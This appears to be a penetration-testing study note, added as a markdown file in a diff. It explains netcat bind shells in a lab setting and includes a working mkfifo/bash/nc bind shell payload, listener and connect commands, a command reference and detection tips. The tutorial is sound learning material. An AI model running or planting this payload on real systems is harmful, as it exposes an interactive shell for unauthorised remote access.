@@ -1,0 +1,416 @@
+# Bind Shell (Netcat)
+
+## Overview
+
+A **bind shell** is a type of shell where the **target host listens on a specific port**, and the **attacker connects to it**.
+
+This differs from a reverse shell:
+
+| Shell Type | Who initiates connection |
+|------------|---------------------------|
+| Bind shell | attacker connects to target |
+| Reverse shell | target connects to attacker |
+
+Bind shells are conceptually simple but often easier to detect because:
+
+- they require an open listening port on the target
+- inbound firewall rules may block the connection
+- exposed services can be discovered during scanning
+
+Netcat (nc) is commonly used to demonstrate how bind shells work.
+
+---
+
+# What is Netcat?
+
+**Netcat** is a networking utility capable of:
+
+- creating TCP/UDP connections
+- listening on ports
+- transferring files
+- creating shells
+- tunnelling traffic
+- debugging network services
+
+Often referred to as:
+
+> the TCP/IP Swiss Army knife
+
+---
+
+# Scenario
+
+Target system:
+
+```
+Ubuntu Linux
+10.129.41.200
+```
+
+Attack host:
+
+```
+10.10.14.117
+```
+
+Goal:
+
+Understand how bind shells operate using Netcat.
+
+---
+
+# Step 1: Basic Netcat Listener
+
+Start listener on target host:
+
+```bash
+nc -lvnp 7777
+```
+
+---
+
+# Parameter Breakdown
+
+| Option | Meaning |
+|--------|--------|
+| -l | listen mode |
+| -v | verbose output |
+| -n | disable DNS resolution |
+| -p 7777 | listening port |
+
+---
+
+# Listener Output
+
+```text
+Listening on [0.0.0.0] (family 0, port 7777)
+```
+
+Target is now waiting for inbound connection.
+
+---
+
+# Step 2: Connect from Attack Host
+
+```bash
+nc -nv 10.129.41.200 7777
+```
+
+---
+
+# Connection Output
+
+Client:
+
+```text
+Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
+```
+
+Server:
+
+```text
+Connection from 10.10.14.117 received!
+```
+
+---
+
+# Step 3: Test Communication Channel
+
+Client sends message:
+
+```text
+Hello Academy
+```
+
+Server receives:
+
+```text
+Hello Academy
+```
+
+At this stage, we have only established a **TCP communication channel**, not a shell.
+
+---
+
+# Why This is Not Yet a Shell
+
+The current connection:
+
+- passes text only
+- does not execute commands
+- does not interact with OS
+
+We need to bind a shell process to the network socket.
+
+---
+
+# Step 4: Create Bind Shell Payload
+
+Run on target host:
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+```
+
+---
+
+# Payload Breakdown
+
+### Remove old pipe
+
+```bash
+rm -f /tmp/f
+```
+
+Deletes existing named pipe if present.
+
+---
+
+### Create named pipe
+
+```bash
+mkfifo /tmp/f
+```
+
+Creates FIFO (First-In-First-Out) special file.
+
+Acts as communication channel.
+
+---
+
+### Redirect input/output between bash and netcat
+
+```bash
+cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+```
+
+Flow:
+
+```
+named pipe → bash shell → netcat → network
+                               ↓
+                       output returned to pipe
+```
+
+---
+
+# Data Flow Diagram
+
+```
+attacker netcat client
+           ↓
+TCP connection
+           ↓
+netcat listener on target
+           ↓
+named pipe (/tmp/f)
+           ↓
+bash interactive shell
+           ↓
+command execution
+           ↓
+output returned to attacker
+```
+
+---
+
+# Step 5: Connect to Bind Shell
+
+From attack host:
+
+```bash
+nc -nv 10.129.41.200 7777
+```
+
+---
+
+# Successful Shell
+
+```text
+Target@server:~$
+```
+
+We now have:
+
+interactive bash shell over TCP connection.
+
+---
+
+# Example Commands
+
+```bash
+whoami
+```
+
+```bash
+pwd
+```
+
+```bash
+ls -la
+```
+
+---
+
+# Why Named Pipes Are Used
+
+Named pipes allow bidirectional communication between:
+
+- bash process
+- netcat socket
+
+Without FIFO pipe, netcat cannot properly interact with shell input/output streams.
+
+---
+
+# Bind Shell Characteristics
+
+## Target listens for connection
+
+Requires open inbound port.
+
+## Attacker initiates connection
+
+Direct TCP session created.
+
+## Simple to deploy
+
+Often used in proof-of-concept exploits.
+
+## Easily detected
+
+Listening ports visible via:
+
+```bash
+netstat
+ss
+nmap
+```
+
+---
+
+# Security Considerations
+
+Bind shells are often blocked by:
+
+- host firewalls
+- NAT routing
+- IDS/IPS detection
+- endpoint protection
+- network segmentation
+
+Because attacker must connect inbound.
+
+---
+
+# Detection Indicators
+
+Defenders may observe:
+
+unexpected listening ports:
+
+```bash
+netstat -antp
+```
+
+suspicious processes:
+
+```bash
+ps aux
+```
+
+unexpected outbound connections.
+
+---
+
+# Why Reverse Shells are Often Preferred
+
+Reverse shells:
+
+- bypass inbound firewall restrictions
+- appear as normal outbound traffic
+- blend with legitimate connections
+- more reliable in restricted environments
+
+Bind shells are still useful when:
+
+- firewall rules allow inbound connections
+- internal network pivoting
+- local privilege escalation scenarios
+- lab environments
+
+---
+
+# Quick Command Reference
+
+## Start basic listener
+
+```bash
+nc -lvnp 7777
+```
+
+## Connect to listener
+
+```bash
+nc -nv 10.129.41.200 7777
+```
+
+## Bind shell payload
+
+```bash
+rm -f /tmp/f
+mkfifo /tmp/f
+cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+```
+
+## Connect to bind shell
+
+```bash
+nc -nv 10.129.41.200 7777
+```
+
+---
+
+# Mental Model
+
+Bind shell exposes a command interpreter on a network port.
+
+Instead of:
+
+```
+attacker waits
+target connects back
+```
+
+we have:
+
+```
+target listens
+attacker connects
+```
+
+---
+
+# Key Takeaways
+
+- bind shells listen on target system.
+- attacker connects directly to target port.
+- netcat commonly used to demonstrate concept.
+- named pipes enable interactive shell functionality.
+- easier to detect than reverse shells.
+- foundational concept for exploitation workflows.
+
+---
+
+# Tags
+
+#shells  
+#bind-shell  
+#netcat  
+#nc  
+#bash  
+#linux  
+#redteam  
+#networking  
+#tcp  
+#obsidian
